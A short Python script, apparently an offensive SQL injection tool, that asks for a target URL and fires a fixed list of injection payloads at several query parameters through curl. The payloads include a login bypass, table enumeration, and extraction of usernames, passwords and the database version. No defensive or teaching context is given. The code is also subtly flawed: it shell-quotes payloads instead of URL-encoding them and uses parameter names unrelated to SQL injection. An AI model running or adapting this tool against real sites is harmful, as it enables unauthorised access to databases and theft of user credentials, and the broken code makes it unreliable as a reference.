import subprocess, shlex
from colorama import Fore, Style

class V1Rtu3h05tInjection:
    def __init__(self):
        self.url = input("Target URL: ").strip()
        self.payloads = [
            "' OR '1'='1", "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--",
            "' UNION ALL SELECT NULL, username, password FROM users--",
            "' UNION SELECT NULL, NULL, CONCAT('Version: ', @@version)--",
            "' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0--",
            "' OR EXISTS (SELECT * FROM users WHERE username = 'admin')--"
        ]
        self.params = ["file_path", "parameter", "command", "directory", "payload"]

    def banner(self):
        print(f"{Fore.RED}{Style.BRIGHT}=== V1Rtu3-h05t Injection ==={Style.RESET_ALL}")

    def scan(self):
        self.banner()
        for payload in self.payloads:
            for param in self.params:
                full_url = f"{self.url}?{param}={shlex.quote(payload)}"
                try:
                    result = subprocess.run(["curl", "-s", full_url], check=True, text=True, capture_output=True)
                    print(f"{Fore.BLUE}Scan: {param} | Payload: {payload}\n{result.stdout}\n{'-'*40}{Style.RESET_ALL}")
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.YELLOW}Error: {e.stderr.strip()}{Style.RESET_ALL}")

    def menu(self):
        self.banner()
        print(f"{Fore.BLUE}1. Run scan\n2. Exit{Style.RESET_ALL}")
        choice = input("Choice: ")
        if choice == '1': self.scan()
        elif choice == '2': print("Exiting.")
        else: print("Invalid choice."); self.menu()

if __name__ == "__main__":
    V1Rtu3h05tInjection().menu()
